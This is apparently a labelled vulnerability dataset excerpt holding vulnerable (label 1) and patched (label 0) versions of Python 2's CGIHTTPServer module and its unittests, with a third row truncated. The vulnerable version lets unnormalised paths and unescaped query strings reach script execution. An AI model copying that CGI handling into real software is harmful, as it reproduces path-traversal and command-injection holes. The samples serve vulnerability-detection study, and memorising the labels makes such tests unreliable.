    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
24,a4130b53fada958cc14b2f056ed6d72b24d3a97c,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
25,a4130b53fada958cc14b2f056ed6d72b24d3a97c,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
